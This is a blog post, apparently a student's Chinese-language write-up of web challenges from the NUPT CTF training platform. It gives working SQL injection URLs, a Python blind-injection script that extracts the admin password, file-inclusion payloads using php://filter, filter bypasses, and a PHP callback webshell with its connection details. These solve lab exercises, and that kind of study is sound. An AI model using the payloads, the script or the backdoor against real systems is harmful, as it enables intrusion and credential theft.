@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="http://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="南邮CTf writeup(web部分)"/>
+  <meta name="twitter:description" content="南邮ctf平台的一些web题解，有几个不能做。
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>南邮CTf writeup(web部分) &middot; Yang1k</title>
+		<link rel="shortcut icon" href="http://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="http://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="http://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='http://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='http://yang1k.github.io/post'>Archive</a>
+	<a href='http://yang1k.github.io/tags'>Tags</a>
+	<a href='http://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="http://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        南邮CTf writeup(web部分)
+                    </h1>
+                    <h2 class="headline">
+                    Dec 13, 2017 09:54
+                    · 779 words
+                    · 4 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="http://yang1k.github.io/tags/php">PHP</a>
+                          
+                              <a href="http://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                              <a href="http://yang1k.github.io/tags/python">python</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#小结">小结</a></li>
+<li><a href="#签到题">签到题</a></li>
+<li><a href="#md5-collision">md5 collision</a></li>
+<li><a href="#签到2">签到2</a></li>
+<li><a href="#这题不是web">这题不是WEB</a></li>
+<li><a href="#层层递进">层层递进</a></li>
+<li><a href="#aaencode">AAencode</a></li>
+<li><a href="#单身二十年">单身二十年</a></li>
+<li><a href="#你从哪里来">你从哪里来</a></li>
+<li><a href="#php-decode">php decode</a></li>
+<li><a href="#文件包含">文件包含</a></li>
+<li><a href="#单身一百年也没用">单身一百年也没用</a></li>
+<li><a href="#download">Download~!</a></li>
+<li><a href="#cookie">COOKIE</a></li>
+<li><a href="#mysql">MYSQL</a></li>
+<li><a href="#sql-injection-3">sql injection 3</a></li>
+<li><a href="#x00">/x00</a>
+<ul>
+<li><a href="#解法一">解法一</a></li>
+<li><a href="#解法二">解法二</a></li>
+</ul></li>
+<li><a href="#bypass-again">bypass again</a></li>
+<li><a href="#变量覆盖">变量覆盖</a></li>
+<li><a href="#php是世界上最好的语言">PHP是世界上最好的语言</a></li>
+<li><a href="#伪装者">伪装者</a></li>
+<li><a href="#header">Header</a></li>
+<li><a href="#上传绕过">上传绕过</a></li>
+<li><a href="#sql注入1">SQL注入1</a></li>
+<li><a href="#pass-check">pass check</a></li>
+<li><a href="#起名字真难">起名字真难</a></li>
+<li><a href="#密码重置">密码重置</a></li>
+<li><a href="#sql-injection-4">sql injection 4</a></li>
+<li><a href="#综合题">综合题</a></li>
+<li><a href="#sql注入2">SQL注入2</a></li>
+<li><a href="#综合题二">综合题二</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <p>南邮ctf平台的一些web题解，有几个不能做。
+<!-- more --></p>
+
+<p><a href="http://ctf.nuptsast.com">平台链接</a></p>
+
+<h3 id="小结">小结</h3>
+
+<p>文件包含
+变量覆盖
+MYSQL
+PHP是世界上最好的语言
+sql injection 4
+综合题二</p>
+
+<hr />
+
+<h3 id="签到题">签到题</h3>
+
+<p>右键查看源代码即可</p>
+
+<pre><code>nctf{flag_admiaanaaaaaaaaaaa}
+</code></pre>
+
+<h3 id="md5-collision">md5 collision</h3>
+
+<p>源码</p>
+
+<pre><code>&lt;?php
+$md51 = md5('QNKCDZO');
+$a = @$_GET['a'];
+$md52 = @md5($a);
+if(isset($a)){
+if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) {
+    echo &quot;nctf{*****************}&quot;;
+} else {
+    echo &quot;false!!!&quot;;
+}}
+else{echo &quot;please input a&quot;;}
+?&gt;
+</code></pre>
+
+<p>PHP md5hash比较缺陷</p>
+
+<p>找一个MD5加密后是0e开头的值即可。</p>
+
+<pre><code>a=s878926199a
+</code></pre>
+
+<pre><code>nctf{md5_collision_is_easy}
+</code></pre>
+
+<h3 id="签到2">签到2</h3>
+
+<p>右键查看源代码，发现输入密码的登录框限制长度最大为10，</p>
+
+<p>抓包提交即可。</p>
+
+<pre><code>nctf{follow_me_to_exploit}
+</code></pre>
+
+<h3 id="这题不是web">这题不是WEB</h3>
+
+<p>确实不是web，将图片下载后用笔记本打开，翻到最底就可以看到flag</p>
+
+<pre><code>nctf{photo_can_also_hid3_msg}
+</code></pre>
+
+<h3 id="层层递进">层层递进</h3>
+
+<p>看了半天没点思路，抓包时发现返回的包状态码是304，了解了一下304状态码，然而并没有什么用。。。</p>
+
+<p>然后继续看网页源代码。</p>
+
+<pre><code>&lt;body&gt;
+&lt;body style=&quot;overflow:auto;&quot;&gt;
+&lt;iframe runat=&quot;server&quot; src=&quot;SO.html&quot; width=&quot;100%&quot; height=&quot;237&quot; frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; allowtransparency=&quot;yes&quot;&gt;&lt;/iframe&gt;
+&lt;iframe runat=&quot;server&quot; src=&quot;http://www.lunzhiyu.com&quot; width=&quot;100%&quot; height=&quot;3800&quot; frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; allowtransparency=&quot;yes&quot;&gt;&lt;/iframe&gt;
+
+
+&lt;/body&gt;
+</code></pre>
+
+<p>可以发现有俩src，下边的src是跳到一个公司的官网，上面那个src是另一个页面。然后在SO.html继续看源码，继续发现src，继续跳转，最后跳到404.html。然后查看源代码。有一段代码如下</p>
+
+<pre><code>&lt;!-- Placed at the end of the document so the pages load faster --&gt;
+&lt;!--  
+&lt;script src=&quot;./js/jquery-n.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-c.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-t.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-f.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-{.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-t.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-h.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-i.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-s.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-_.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-i.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-s.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-_.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-a.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-_.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-f.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-l.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-4.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-g.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-}.7.2.min.js&quot;&gt;&lt;/script&gt;
+--&gt;
+
+</code></pre>
+
+<p>刚开始没注意，后来才看到jquery-后的字母竖着连起来就是flag。。。。。。</p>
+
+<pre><code>nctf{this_is_a_fl4g}
+</code></pre>
+
+<h3 id="aaencode">AAencode</h3>
+
+<p>百度知道AAencode是一种将js代码加密的方式。</p>
+
+<p>解密办法：直接在控制台粘贴加密过的代码即可。网上也有专门的转换网站。</p>
+
+<pre><code>nctf{javascript_aaencode}
+</code></pre>
+
+<h3 id="单身二十年">单身二十年</h3>
+
+<p>抓包到repeater下重发就能看到flag。</p>
+
+<pre><code>nctf{yougotit_script_now}
+</code></pre>
+
+<h3 id="你从哪里来">你从哪里来</h3>
+
+<p>打开页面看到are you from google?
+于是就想到修改Referer，但是修改了好多次都没有看到flag，很奇怪。</p>
+
+<p>到网上查writeup也都是修改Referer，很难受。</p>
+
+<p>以后再看吧。</p>
+
+<h3 id="php-decode">php decode</h3>
+
+<p>拿到源码放在本地把eval去掉运行，就出来flag了，</p>
+
+<pre><code>nctf{gzip_base64_hhhhhh}
+</code></pre>
+
+<h3 id="文件包含">文件包含</h3>
+
+<p>本身对文件包含就不太熟，这次又学会了新姿势。</p>
+
+<p>这道题用到了使用php封装协议读取php文件最终的payload为</p>
+
+<pre><code>http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
+</code></pre>
+
+<p>拿到的是经过base64加密的代码，拿去解密即可得到flag。</p>
+
+<pre><code>nctf{edulcni_elif_lacol_si_siht}
+</code></pre>
+
+<h3 id="单身一百年也没用">单身一百年也没用</h3>
+
+<p>抓包发包，看响应包。。。。。。。</p>
+
+<pre><code> nctf{this_is_302_redirect}
+</code></pre>
+
+<h3 id="download">Download~!</h3>
+
+<p>查看源代码可见下载的参数为url，而且下载的文件名经过base64编码。把download.php编码后添加到url参数，结果download.php下载成功，然后发现hereiskey.php，继续下载，得到flag.</p>
+
+<pre><code>nctf{download_any_file_666}
+</code></pre>
+
+<h3 id="cookie">COOKIE</h3>
+
+<p>抓包修改cookie为1</p>
+
+<pre><code>nctf{cookie_is_different_from_session}
+</code></pre>
+
+<h3 id="mysql">MYSQL</h3>
+
+<p>进去提示robots.txt(第一次知道robots.txt，记得还是大哥在的时候，哎..),然后访问得到提示</p>
+
+<pre><code>
+TIP:sql.php
+
+&lt;?php
+if($_GET[id]) {
+   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
+  mysql_select_db(SAE_MYSQL_DB);
+  $id = intval($_GET[id]);
+  $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id='$id'&quot;));
+  if ($_GET[id]==1024) {
+      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;
+  }
+  else{
+    echo($query[content]);
+  }
+}
+?&gt;
+</code></pre>
+
+<p>intval函数是将变量转换为整型的函数，阅读代码可知道要传入一个id参数，又看到$_GET[id]不能等于1024，但是没有直接用$id不等于1024，所以猜想这个参数经过intval处理后等于1024，不处理不等于1024.</p>
+
+<p>到这里之后去查看php手册，发现下面这段解释</p>
+
+<pre><code>如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，  
+2.  如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，  
+3.  将使用 10 进制 (decimal)。 
+
+</code></pre>
+
+<p>于是想到传一个8进制(02000)或者16进制(0x400)的1024，然而没有反应。。</p>
+
+<p>经测试后发现传入的参数被转换成了字符类型。。。</p>
+
+<pre><code>$a = $_GET[id]; //id=02000
+var_dump($a);
+输出:string(5) &quot;02000&quot; 
+</code></pre>
+
+<p>这个为什么会转换为字符型到网上没有找到。。。求大佬解。。</p>
+
+<p>意外发现了这个，这个执行后输出的是true。</p>
+
+<pre><code>if ('01024'==1024) {
+    echo true;
+}else{
+    echo false;
+}
+</code></pre>
+
+<p>最后还是去看了writeup，结果是用小数解出了这个&hellip;我是真的菜。。。</p>
+
+<pre><code>nctf{query_in_mysql}
+</code></pre>
+
+<h3 id="sql-injection-3">sql injection 3</h3>
+
+<p>根据提示可知是宽字节注入</p>
+
+<p>payload</p>
+
+<pre><code>//爆表
+http://chinalover.sinaapp.com/SQL-GBK/index.php?id=4%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+//爆列
+http://chinalover.sinaapp.com/SQL-GBK/index.php?id=4%df' union select 1,group_concat(column_name) from information_schema.columns where table_name=%df'ctf4%df' --+  
+//爆flag
+http://chinalover.sinaapp.com/SQL-GBK/index.php?id=4%df' union select 1,flag from ctf4 --+
+</code></pre>
+
+<p>在爆列的时候，很奇怪，payload在本地测试过没有问题的，但是就是会报错，又因为在id=3的时候提示flag在ctf4，于是猜想列是flag，于是直接爆出来。。</p>
+
+<pre><code>nctf{gbk_3sqli}
+</code></pre>
+
+<h3 id="x00">/x00</h3>
+
+<p>题目地址：题目有多种解法，你能想出来几种？</p>
+
+<h4 id="解法一">解法一</h4>
+
+<p>payload</p>
+
+<pre><code>http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=1
+</code></pre>
+
+<p>提交一个数组进去，直接绕过所有的比较。</p>
+
+<h4 id="解法二">解法二</h4>
+
+<p>ereg函数存在00截断漏洞，就是在匹配到%00的时候就会结束。</p>
+
+<p>payload</p>
+
+<pre><code>http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=6%00%23biubiubiu
+</code></pre>
+
+<p>这里要将#换成%23，不然会浏览器会认为这是锚点，然后会丢掉#后的biubiubiu。在抓包看的时候确实丢掉了biubiubiu，所以在这里使用%23代替#。</p>
+
+<p>目前就知道这两种。</p>
+
+<pre><code>nctf{use_00_to_jieduan}
+</code></pre>
+
+<h3 id="bypass-again">bypass again</h3>
+
+<p>MD5哈希比较缺陷即0e开头的MD5字符串弱类型相等</p>
+
+<p>payload</p>
+
+<pre><code>http://chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&amp;b=s878926199a
+</code></pre>
+
+<pre><code>nctf{php_is_so_cool}
+</code></pre>
+
+<h3 id="变量覆盖">变量覆盖</h3>
+
+<p>之前还没有见过这个洞，百度了一下原理，就是说在使用类似于使用extract这种函数时会造成将原有变量的值覆盖的情况。</p>
+
+<p>extract函数</p>
+
+<pre><code>本函数用来将变量从数组中导入到当前的符号表中。 
+就是将数组的键名变为变量名，将数组的值转化为变量的值。
+</code></pre>
+
+<p>举例代码：</p>
+
+<pre><code>&lt;?php
+$a = 1;
+extract($_GET);
+
+if ($a === $b) {
+	echo &quot;yes&quot;;
+}else{
+	echo 'no';
+}
+?&gt;
+</code></pre>
+
+<p>如果我们构造payload；?a=yang&amp;b=yang,这样的get传参在经过extract处理后，就会覆盖掉原有的$a的值，从而使输出yes。这就是变量覆盖漏洞。</p>
+
+<pre><code>nctf{bian_liang_fu_gai!}
+</code></pre>
+
+<h3 id="php是世界上最好的语言">PHP是世界上最好的语言</h3>
+
+<p>源码</p>
+
+<pre><code>&lt;?php
+if(eregi(&quot;hackerDJ&quot;,$_GET[id])) {
+  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
+  exit();
+}
+
+$_GET[id] = urldecode($_GET[id]);
+if($_GET[id] == &quot;hackerDJ&quot;)
+{
+  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
+  echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;;
+}
+?&gt;
+
+</code></pre>
+
+<p>可以看到其中有一个urldecode(),这是进行url解码的函数，又因为在浏览器往服务器传数据的时候会自动进行一次url解码，所以这道题是用双重url编码来做。
+借此了解了一下url编码是怎么回事，url编码就是一个字符ascii码的16进制然后在前面在加上%，在进行二次url编码时，只是将第一次编码的值前的%进行url编码，后面数字不动。%URL编码后是%25。
+下面以&rsquo;h&rsquo;为例：</p>
+
+<pre><code>h
+第一次url编码 %68
+第一次url编码 %2568
+</code></pre>
+
+<p>构造参数为%2568ackerDJ。</p>
+
+<pre><code>nctf{php_is_best_language}
+</code></pre>
+
+<h3 id="伪装者">伪装者</h3>
+
+<p>提示如下</p>
+
+<pre><code>
+* * * * * * * * * * * * * * * * * * * * * * * * * *
+
+         管理系统只能在本地登陆
+
+           本系统外部禁止访问
+
+* * * * * * * * * * * * * * * * * * * * * * * * * *
+不是本地登陆你还想要flag？
+</code></pre>
+
+<p>于是想到IP伪造添加 X-Forwarded-For：127.0.0.1</p>
+
+<p>但是不出flag，想不出别的办法，到网上看writeup，都是这样做的。。我也很是无语。。。</p>
+
+<h3 id="header">Header</h3>
+
+<p>抓包发包，flag就在返回包。</p>
+
+<pre><code>nctf{tips_often_hide_here}
+</code></pre>
+
+<h3 id="上传绕过">上传绕过</h3>
+
+<p>00截断即可。</p>
+
+<pre><code>nctf{welcome_to_hacks_world}
+</code></pre>
+
+<h3 id="sql注入1">SQL注入1</h3>
+
+<p>查看源码，构造payload如下</p>
+
+<pre><code>admin' ) #
+</code></pre>
+
+<p>结果</p>
+
+<pre><code>nctf{ni_ye_hui_sql?}
+</code></pre>
+
+<h3 id="pass-check">pass check</h3>
+
+<p>弱类型，传入pass[]=1</p>
+
+<pre><code>nctf{strcmp_is_n0t_3afe}
+</code></pre>
+
+<h3 id="起名字真难">起名字真难</h3>
+
+<p>可以传入16进制的54975581388绕过</p>
+
+<pre><code>web12/index.php?key=0xccccccccc
+</code></pre>
+
+<pre><code>nctf{follow_your_dream}
+</code></pre>
+
+<h3 id="密码重置">密码重置</h3>
+
+<p>抓包修改更改的用户名</p>
+
+<pre><code>http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg%3D%3D
+</code></pre>
+
+<p>由url可以发现有一个get传参，看似base64，解密后是ctfuser，所以这里也要修改为admin的base64的值。</p>
+
+<pre><code>nctf{reset_password_often_have_vuln}
+</code></pre>
+
+<h3 id="sql-injection-4">sql injection 4</h3>
+
+<pre><code>&lt;?php
+#GOAL: login as admin,then get the flag;
+error_reporting(0);
+require 'db.inc.php';
+
+function clean($str){
+	if(get_magic_quotes_gpc()){
+		$str=stripslashes($str);
+	}
+	return htmlentities($str, ENT_QUOTES);
+}
+
+$username = @clean((string)$_GET['username']);
+$password = @clean((string)$_GET['password']);
+
+$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
+$result=mysql_query($query);
+if(!$result || mysql_num_rows($result) &lt; 1){
+	die('Invalid password!');
+}
+
+echo $flag;
+
+?&gt;
+</code></pre>
+
+<p>构造参数</p>
+
+<pre><code>username=admin\&amp;password= or 1=1 %23
+</code></pre>
+
+<p>最后的sql语句就是</p>
+
+<pre><code>SELECT * FROM users WHERE name='username=admin\' AND pass=' or 1=1 #sdasd';
+</code></pre>
+
+<p>因为代码使用htmlentities，所以不能使用单引号闭合语句。</p>
+
+<pre><code>nctf{sql_injection_is_interesting}
+</code></pre>
+
+<h3 id="综合题">综合题</h3>
+
+<p>打开先看到的是一堆编码，百度知道是JSFuck编码，解码站(<a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a>)</p>
+
+<p>解码之后出现1bc29b36f623ba82aaf6724fd3b16718.php，然后访问提示</p>
+
+<pre><code>哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里
+</code></pre>
+
+<p>抓包看到 tip：history of bash</p>
+
+<p>百度知道linux会有一个.bash_history文件用来保存用户使用过的命令，接着访问这个文件，得到提示</p>
+
+<pre><code>zip -r flagbak.zip ./*
+</code></pre>
+
+<p>再接着访问这个压缩包，下载后解压就得到flag</p>
+
+<pre><code>nctf{bash_history_means_what}
+</code></pre>
+
+<h3 id="sql注入2">SQL注入2</h3>
+
+<p>查看源码，万能密码</p>
+
+<pre><code>username = 1' union select &quot;c4ca4238a0b923820dcc509a6f75849b&quot; #
+password = 1
+</code></pre>
+
+<pre><code>ntcf{union_select_is_wtf}
+</code></pre>
+
+<h3 id="综合题二">综合题二</h3>
+
+<p>打开看到是一个留言板，最下面有一个&rsquo;本cms说明&rsquo;的超链接，点进去之后可以发现几个网站的文件</p>
+
+<pre><code>config.php
+index.php
+passencode.php
+say.php
+sm.txt
+create table admin ( id integer, username text, userpass text, )
+</code></pre>
+
+<p>然后看到这个说明用了文件包含</p>
+
+<pre><code>http://cms.nuptzj.cn/about.php?file=sm.txt
+</code></pre>
+
+<p>于是想尝试包含刚刚的几个文件，试了一下，除了config.php剩下的都读出来了。这里用了phpphp伪协议读取文件（出来的格式好看）</p>
+
+<pre><code>http://cms.nuptzj.cn/about.php?file=php://filter/read=convert.base64-encode/resource=index.php
+</code></pre>
+
+<p>index.php的部分代码</p>
+
+<pre><code>	include 'antixss.php';
+	include 'config.php';
+	
+&lt;form method=&quot;post&quot; action=&quot;./so.php&quot;&gt;
+	   留言搜索(输入ID):
+	 &lt;input name=&quot;soid&quot; type=&quot;text&quot; id=&quot;soid&quot; /&gt;
+	 &lt;input type=&quot;submit&quot;  value=&quot;搜索&quot;/&gt;
+&lt;/form&gt;
+</code></pre>
+
+<p>在这里又发现了antixss.php和so.php，继续包含文件。</p>
+
+<p>antixss.php是一个过滤xss的代码，没有什么用。</p>
+
+<p>继续看so.php代码，发现antiinject.php，继续包含</p>
+
+<p>antiinject.php是一个过滤SQL语句关键字的函数，细看发现单词混写可以绕过。</p>
+
+<pre><code>&lt;?php
+function antiinject($content){
+$keyword=array(&quot;select&quot;,&quot;union&quot;,&quot;and&quot;,&quot;from&quot;,' ',&quot;'&quot;,&quot;;&quot;,'&quot;',&quot;char&quot;,&quot;or&quot;,&quot;count&quot;,&quot;master&quot;,&quot;name&quot;,&quot;pass&quot;,&quot;admin&quot;,&quot;+&quot;,&quot;-&quot;,&quot;order&quot;,&quot;=&quot;);
+$info=strtolower($content);
+for($i=0;$i&lt;=count($keyword);$i++){
+ $info=str_replace($keyword[$i], '',$info);
+}
+return $info;
+}
+?&gt;
+</code></pre>
+
+<p>so.php代码如下</p>
+
+<pre><code>&lt;?php
+if($_SERVER['HTTP_USER_AGENT']!=&quot;Xlcteam Browser&quot;){
+echo '万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~';
+    exit();
+}
+$id=$_POST['soid'];
+include 'config.php';
+include 'antiinject.php';
+include 'antixss.php';
+$id=antiinject($id);  //单词混写可绕过
+$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;不能连接到数据库！！&quot;.mysql_error());
+mysql_select_db($db_name,$con);
+$id=mysql_real_escape_string($id);
+$result=mysql_query(&quot;SELECT * FROM `message` WHERE display=1 AND id=$id&quot;);  //这是一个整型注入，转义并没有什么卵用。。。。
+$rs=mysql_fetch_array($result);
+echo htmlspecialchars($rs['nice']).':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'.antixss($rs['say']).'&lt;br /&gt;';
+mysql_free_result($result);
+mysql_free_result($file);
+mysql_close($con);
+?&gt;
+</code></pre>
+
+<p>就是在so.php发现了注入点，用burpsuite测试后，发现这个只能盲注，脚本如下</p>
+
+<pre><code>#coding=utf-8
+import requests
+import re
+def bool(mid,asc):
+	url = 'http://cms.nuptzj.cn/so.php'
+	header = {
+	'User-Agent': 'Xlcteam Browser',
+	}
+	data = {'soid': '1/**/anandd/**/ascii(mid((seselectlect/**/group_concat(userpapassss)/**/frfromom/**/admiadminn),'+str(mid)+',1))&gt;'+str(asc)+''}
+	r = requests.post(url,headers=header,data=data)
+	if len(r.content.decode('utf-8'))&gt;500:
+		return 1	#sucess
+	else:
+		return 0	#fail
+answer = ''	
+for mid in xrange(1,37):
+	min1=1
+	max1=256
+	while 1:
+		middle=(min1+max1)/2
+		if bool(mid,middle)==1:  
+			min1=middle
+		if bool(mid,middle)==0:  
+			max1=middle
+		if max1-min1==1:
+			answer = answer + chr(max1)
+			print answer
+			break
+</code></pre>
+
+<p>写完在实验室跑脚本，只能跑一部分，就报错了。一直以为脚本有问题，回到宿舍就直接全爆出来了。。。。</p>
+
+<p>跑出来的结果</p>
+
+<pre><code>102 117 99 107 114 117 110 116 117
+</code></pre>
+
+<p>拿去ascii解码后是 fuckruntu，用户名爆出的是admin。用户名和密码都拿到了，可是没有找到后台。。看了writeup才知道后台的提示在about.php。。。</p>
+
+<p>about.php代码</p>
+
+<pre><code>
+&lt;?php
+$file=$_GET['file'];
+if($file==&quot;&quot; || strstr($file,'config.php')){
+echo &quot;file参数不能为空！&quot;;
+exit();
+}else{
+$cut=strchr($file,&quot;loginxlcteam&quot;);
+if($cut==false){
+$data=file_get_contents($file);
+$date=htmlspecialchars($data);
+echo $date;
+}else{
+echo &quot;&lt;script&gt;alert('敏感目录，禁止查看！但是。。。')&lt;/script&gt;&quot;;
+}
+}
+</code></pre>
+
+<p>loginxlcteam就是后台地址，登录进去提示留有小马 xlcteam.php，继续包含</p>
+
+<pre><code>&lt;?php
+$_POST['wtf'] = 'aa'
+$e = $_REQUEST['www'];
+$arr = array($_POST['wtf'] =&gt; '|.*|e',);
+array_walk($arr, $e, '');
+?&gt;
+</code></pre>
+
+<p>这个木马看不懂，看了几篇文章才知道这是回调后门
+<a href="http://static.hx99.net/static/drops/tips-7279.html">http://static.hx99.net/static/drops/tips-7279.html</a></p>
+
+<p>菜刀连接</p>
+
+<pre><code>地址：http://cms.nuptzj.cn/xlcteam.php?www=preg_replace
+密码：wtf
+</code></pre>
+
+<pre><code>flag:nctf{you_are_s0_g00d_hacker}
+</code></pre>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2fyang1k.github.io%2fpost%2f%25E5%258D%2597%25E9%2582%25AEctf-web%2f - %e5%8d%97%e9%82%aeCTf%20writeup%28web%e9%83%a8%e5%88%86%29 "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2019 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="http://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="http://yang1k.github.io/js/main.js"></script>
+<script src="http://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
